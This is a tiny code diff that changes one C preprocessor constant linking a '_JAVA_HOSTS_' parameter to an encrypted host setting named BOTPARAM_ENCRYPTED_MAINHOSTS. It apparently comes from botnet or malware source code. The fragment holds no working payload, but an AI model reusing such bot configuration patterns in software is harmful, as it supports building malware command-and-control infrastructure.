@@ -12,7 +12,7 @@
 //---------------------------------------------------------
 #define JAVA_PARAM_NAME       "_JAVA_HOSTS_\0"
 #define JAVA_PARAM_SIZE       200
-#define JAVA_PARAM_ENCRYPTED  BOTPARAM_ENCRYPTED_HOSTS
+#define JAVA_PARAM_ENCRYPTED  BOTPARAM_ENCRYPTED_MAINHOSTS
 
 
 //-------------------------------------------------------------------
